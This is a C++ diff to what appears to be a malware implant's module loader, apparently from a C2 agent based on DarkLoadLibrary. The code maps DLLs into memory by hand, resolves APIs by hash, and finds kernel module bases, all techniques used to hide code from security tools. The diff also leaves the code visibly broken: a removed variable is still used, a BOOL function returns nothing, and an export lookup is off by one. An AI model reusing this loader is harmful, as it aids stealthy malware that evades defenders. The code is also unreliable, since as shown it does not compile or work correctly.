@@ -31,7 +31,7 @@ namespace Modules {
         return nullptr;
     }
 
-    FARPROC FindExportAddress(const void *base, const uint32 hash) {
+    FARPROC FindExportAddress(const VOID *base, const UINT32 hash) {
         FARPROC address = nullptr;
 
         const auto nt_head = (PIMAGE_NT_HEADERS) (base + ((PIMAGE_DOS_HEADER) base)->e_lfanew);
@@ -41,12 +41,12 @@ namespace Modules {
             return address;
         }
 
-		const auto functions = (uint32*) (U_PTR(base) + exports->AddressOfFunctions);
-		const auto ordinals = (uint16*) (U_PTR(base) + exports->AddressOfNameOrdinals);
-		const auto names = (uint32*) (U_PTR(base) + exports->AddressOfNames);
+		const auto functions = (UINT32*) (U_PTR(base) + exports->AddressOfFunctions);
+		const auto ordinals = (UINT16*) (U_PTR(base) + exports->AddressOfNameOrdinals);
+		const auto names = (UINT32*) (U_PTR(base) + exports->AddressOfNames);
 		
         for (auto index = 0; index < exports->NumberOfNames; index++) {
-            const auto name = (char*) (U_PTR(base) + names[index]);
+            const auto name = (CHAR*) (U_PTR(base) + names[index]);
 
             char buffer[MAX_PATH] = { };
 
@@ -59,31 +59,48 @@ namespace Modules {
         return address;
     }
 
+	BOOL DestroyModule(EXECUTABLE *mod) {
+		HEXANE;
+
+		if (mod->base) {
+			ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &mod->base, &mod->base_size, MEM_RELEASE);
+		}
+		if (mod->buffer) {
+			ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &mod->buffer, &mod->buf_size, MEM_RELEASE);
+		}
+		if (mod->local_name) {
+			Free(mod->local_name);
+		}
+		if (mod->cracked_name) {
+			Free(mod->cracked_name);
+		}
+	}
+
 	// TODO: string hash module_name
 	UINT_PTR FindKernelModule(char *module_name) {
 		HEXANE;
 
-		void *buffer = nullptr;
-		size_t buffer_size = 0;
+		VOID *buffer = nullptr;
+		SIZE_T buf_size = 0;
 
-		if (!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buffer_size, (PULONG)&buffer_size))) {
+		if (!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buf_size, (PULONG)&buf_size))) {
 			return 0;
 		}
 
 		while (ntstatus == STATUS_INFO_LENGTH_MISMATCH) {
 			if (buffer) {
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buf_size, MEM_RELEASE);
 			}
 
-			if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &buffer, 0, &buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) ||
-				!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buffer_size, (PULONG)&buffer_size))) {
+			if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), &buffer, 0, &buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) ||
+				!NT_SUCCESS(ntstatus = ctx->win32.NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemModuleInformation, buffer, buf_size, (PULONG)&buf_size))) {
 				return 0;
 			}
 		}
 
 		if (!NT_SUCCESS(ntstatus)) {
 			if (buffer) {
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buf_size, MEM_RELEASE);
 			}
 			return 0;
 		}
@@ -94,22 +111,22 @@ namespace Modules {
 		}
 
 		for (auto i = 0; i < modules->NumberOfModules; ++i) {
-			const char *current_module_name = (char*) modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
+			const char *current_module_name = (CHAR*) modules->Modules[i].FullPathName + modules->Modules[i].OffsetToFileName;
 
 			if (!MbsCompare(current_module_name, module_name)) {
-				const uintptr_t result = (uintptr_t) modules->Modules[i].ImageBase;
+				CONST UINT_PTR result = (UINT_PTR) modules->Modules[i].ImageBase;
 
-				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buf_size, MEM_RELEASE);
 				return result;
 			}
 		}
 
-		ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buffer_size, MEM_RELEASE);
+		ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), &buffer, &buf_size, MEM_RELEASE);
 		return 0;
 	}
 
 	// TODO: string hash function name 
-	FARPROC FindKernelExport(HANDLE handle, uintptr_t base, const char *function) {
+	FARPROC FindKernelExport(HANDLE handle, UINT_PTR base, CONST CHAR *function) {
 		HEXANE;
 
 		UINT_PTR address = 0;
@@ -143,15 +160,15 @@ namespace Modules {
 		}
 		
 		for (auto index = 0; index < export_data->NumberOfNames; index++) {
-            const auto name = (char*) (base + ((uint32*) (base + exports->AddressOfNames))[index - 1]);
+            const auto name = (CHAR*) (base + ((UINT32*) (base + exports->AddressOfNames))[index - 1]);
 
 			if (MbsCompare(name, function) == 0) {
-				const auto ord = (uint16*) (base + ((uint16*) (base + exports->AddressOfNameOrdinals))[index]);
+				const auto ord = (UINT16*) (base + ((UINT16*) (base + exports->AddressOfNameOrdinals))[index]);
 				if (*ord <= 0x1000) {
 					break;
 				}
 
-                address = (base + ((uint32*) (base + exports->AddressOfFunctions))[index]);
+                address = (base + ((UINT32*) (base + exports->AddressOfFunctions))[index]);
 				if (address >= base + U_PTR(exports) && address <= base + U_PTR(exports) + exports_size) {
 					address = 0; // function address is out of range, somehow (?)
 				}
@@ -162,7 +179,7 @@ namespace Modules {
 
 	defer:
 		if (export_data) {
-			ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &export_data, &exports_size, MEM_RELEASE);
+			ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &export_data, &exports_size, MEM_RELEASE);
 			export_data = nullptr;
 		}
 
@@ -198,7 +215,7 @@ namespace Modules {
 		return sec_address;
 	}
 
-    VOID InsertTailList(LIST_ENTRY *const head, LIST_ENTRY *const entry) {
+    VOID InsertTailList(LIST_ENTRY *CONST head, LIST_ENTRY *CONST entry) {
         PLIST_ENTRY blink = head->Blink;
 
         entry->Flink   = head;
@@ -379,7 +396,6 @@ namespace Modules {
             auto import_desc = RVA(PIMAGE_IMPORT_DESCRIPTOR, mod->base, import_dire->VirtualAddress); 
             for (; import_desc->Name; import_desc++) {
 
-				__debugbreak();
                 HMODULE library = nullptr;
                 CONST CHAR *name = RVA(PCHAR, mod->base, import_desc->Name);
 				CONST UINT32 hash = HashStringA(MbsToLower((PCHAR)buffer, name), MbsLength(name));
@@ -472,7 +488,6 @@ namespace Modules {
             node = (PRTL_BALANCED_NODE) (node->ParentValue & ~0x7);
         } while (node->ParentValue & ~0x7);
 
-
         if (!node->Red) {
             UINT32 length = 0;
             SIZE_T begin = 0;
@@ -516,13 +531,11 @@ namespace Modules {
         return index;
     }
 
-
     BOOL MapModule(EXECUTABLE *mod) {
         HEXANE;
 
 		bool success = false;
 
-		SIZE_T region_size = 0;
 		UINT_PTR base_rva  = 0;
 		PIMAGE_DATA_DIRECTORY relocdir = nullptr;
 		
@@ -531,16 +544,16 @@ namespace Modules {
 		}
 
         mod->base = B_PTR(mod->nt_head->OptionalHeader.ImageBase);
-        region_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
+        mod->base_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
 
-        if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+        if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &mod->base_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
             U_PTR(mod->base) != mod->nt_head->OptionalHeader.ImageBase) {
 
             mod->base = 0;
-            region_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
+            mod->base_size = (size_t) mod->nt_head->OptionalHeader.SizeOfImage;
 
 			// NOTE: test non-prefered image base
-            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
+            if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**) &mod->base, 0, &mod->base_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) ||
 				region_size != mod->nt_head->OptionalHeader.SizeOfImage) {
                 goto defer;
             }
@@ -714,19 +727,19 @@ namespace Modules {
             return false;
         }
 
-        SIZE_T size = ctx->win32.GetFileSize(handle, nullptr);
-        if (size == INVALID_FILE_SIZE) {
+        mod->buf_size = ctx->win32.GetFileSize(handle, nullptr);
+        if (mod->buf_size == INVALID_FILE_SIZE) {
             ctx->win32.NtClose(handle);
             return false;
         }
 
-        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, size, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+        if (!NT_SUCCESS(ntstatus = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, mod->buf_size, &mod->buf_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
             ctx->win32.NtClose(handle);
             return false;
         }
 
-        if (!ctx->win32.ReadFile(handle, mod->buffer, size, (DWORD*) &mod->size, nullptr)) {
-            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &size, 0);
+        if (!ctx->win32.ReadFile(handle, mod->buffer, mod->buf_size, (DWORD*) &mod->buf_size, nullptr)) {
+            ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &mod->buffer, &mod->buf_size, 0);
             ctx->win32.NtClose(handle);
             return false;
         }
@@ -806,10 +819,13 @@ namespace Modules {
         return true;
     }
 
-    PEXECUTABLE ImportModule(const uint32 load_type, const uint32 name_hash, uint8 *memory, const uint32 mem_size, wchar_t *name) {
+    PEXECUTABLE ImportModule(CONST UINT32 load_type, CONST UINT32 name_hash, UINT8 *memory, CONST UINT32 mem_size, WCHAR *name, BOOL cache) {
         // NOTE: code based off of https://github.com/bats3c/DarkLoadLibrary
         HEXANE;
 
+		if (WINHTTP - name_hash == 0) {
+			__debugbreak();
+		}
         EXECUTABLE *mod = (EXECUTABLE*) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, sizeof(EXECUTABLE));
         if (!mod) {
             return nullptr;
@@ -838,8 +854,9 @@ namespace Modules {
 
 				break;
 			}
+			// TODO: this conflicts with the MapModule function
             case LoadMemory: {
-				mod->size         = mem_size;
+				mod->buf_size     = mem_size;
 				mod->buffer       = memory;
 				mod->cracked_name = name;
 				mod->local_name   = name;
@@ -887,6 +904,18 @@ namespace Modules {
         mod->success = true;
 
         defer:
+		if (!mod->success) {
+			DestroyModule(mod);
+
+			mod->buffer = nullptr;
+			mod->base = nullptr;
+		}
+		if (!cache) {
+			if (mod->buffer) {
+				ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (void**) &mod->buffer, &mod->buf_size, MEM_RELEASE);
+				mod->buffer = nullptr;
+			}
+		}
         // TODO: delete the _executable* and keep the base. that's all I need tbh...
         return mod;
     }
